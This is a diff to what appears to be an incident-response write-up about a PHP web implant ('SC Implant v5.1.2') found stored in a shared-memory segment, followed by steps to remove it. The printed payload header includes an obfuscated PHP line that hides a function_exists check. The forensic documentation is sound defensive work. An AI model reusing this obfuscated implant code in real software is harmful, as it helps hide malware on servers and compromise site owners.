@@ -116,7 +116,7 @@ if addr and addr != 0xffffffffffffffff:
 '
 
 ### Extracted RAM Payload Header (shm_753798_evidence.bin):
-
+```
 SCSHM1:452267:f0868ac8d3d7f145a1245795769dc51150cddfa445abdb99ca15098d7b0b04f3
 <?php
 /**
@@ -140,6 +140,7 @@ if (!(("\x66\x75n\x63\x74\x69\x6fn" . '_e' . 'xist' . 's')('sc_de' . 'dup'))) {}
 
 
 This conclusively proved that SC Implant v5.1.2 (/* SCV:5.1.2 */) was stored verbatim inside kernel memory segment 753798 with the SCSHM1:<length>:<sha256> header.
+```
 
 ### Step 3.4: Eradicating the Kernel Memory Segment on ztqudefh
 The segment was destroyed and active LiteSpeed PHP workers for ztqudefh were terminated:
